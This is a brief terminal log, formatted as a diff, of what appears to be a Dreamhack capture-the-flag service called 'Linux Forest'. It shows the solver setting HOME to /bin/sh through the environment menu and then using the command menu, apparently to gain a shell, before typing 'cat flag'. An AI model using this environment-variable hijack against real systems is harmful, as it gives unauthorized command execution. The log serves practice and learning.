@@ -1,0 +1,27 @@
+root@LAPTOP-RU2HPB6J:~# nc host1.dreamhack.games 11140
+==== Linux Forest ====
+0. Exit
+1. Execute a command
+2. Manage environments
+3. Create a temp directory
+4. Write a file to temp directory
+==== ------------ ====
+> 2
+1. get
+2. set
+> 2
+HOME
+/bin/sh
+HOME=/bin/sh
+==== Linux Forest ====
+0. Exit
+1. Execute a command
+2. Manage environments
+3. Create a temp directory
+4. Write a file to temp directory
+==== ------------ ====
+> 1
+p. ls
+i. id
+~
+cat flag
